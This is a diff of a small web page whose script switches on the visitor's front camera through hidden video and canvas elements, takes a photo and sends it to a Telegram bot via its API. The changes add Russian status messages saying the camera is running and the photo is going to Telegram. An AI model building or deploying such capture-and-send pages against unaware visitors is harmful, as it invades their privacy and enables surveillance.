@@ -14,22 +14,18 @@
             align-items: center;
             justify-content: center;
             font-family: sans-serif;
+            flex-direction: column;
+            gap: 16px;
         }
-        img {
-            max-width: 90%;
-            max-height: 90%;
-            border-radius: 12px;
-        }
-        p {
-            color: #777;
-        }
+        img { max-width: 90%; border-radius: 12px; }
+        p { color: #555; font-size: 18px; text-align: center; padding: 0 20px; }
     </style>
 </head>
 <body>
 
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
-<p id="status">Загрузка...</p>
+<p id="status">Запускаю камеру...</p>
 <img id="photo" style="display:none;">
 
 <script>
@@ -42,48 +38,41 @@
     const status = document.getElementById("status");
 
     async function sendToTelegram(blob) {
+        status.textContent = "Отправляю в Telegram...";
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", blob, "photo.png");
-
         try {
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: "POST",
                 body: formData
             });
             const data = await res.json();
-            console.log("Отправлено в Telegram:", data.ok);
+            status.textContent = data.ok ? "Отправлено!" : "Ошибка Telegram: " + JSON.stringify(data);
         } catch (e) {
-            console.log("Ошибка отправки:", e);
+            status.textContent = "Ошибка отправки: " + e.message;
         }
     }
 
     async function takePhoto() {
+        status.textContent = "Запрашиваю камеру...";
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user" }
-            });
-
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            status.textContent = "Камера открыта, делаю фото...";
             video.srcObject = stream;
             await video.play();
-
             await new Promise(r => setTimeout(r, 500));
-
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext("2d").drawImage(video, 0, 0);
-
             stream.getTracks().forEach(t => t.stop());
-
             canvas.toBlob(async (blob) => {
                 photo.src = URL.createObjectURL(blob);
                 photo.style.display = "block";
-                status.style.display = "none";
                 await sendToTelegram(blob);
             }, "image/png");
-
         } catch (e) {
-            status.textContent = "Ошибка: " + e.name;
+            status.textContent = "Ошибка камеры: " + e.name + " — " + e.message;
         }
     }
 
